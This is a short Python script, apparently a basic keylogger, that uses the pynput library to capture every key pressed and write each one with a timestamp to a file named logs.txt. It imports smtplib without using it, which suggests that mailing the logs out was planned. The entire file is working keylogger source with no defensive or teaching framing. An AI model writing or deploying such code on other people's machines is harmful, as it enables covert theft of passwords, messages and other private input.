# Imports
from pynput.keyboard import Key ,Listener
import logging
import smtplib


log_dir = ""
logging.basicConfig(filename = (log_dir + "logs.txt") , level = logging.DEBUG, format = '%(asctime)s:%(message)s')
def on_press(key):
    logging.info(key)
with Listener(on_press=on_press) as listener:
    listener.join()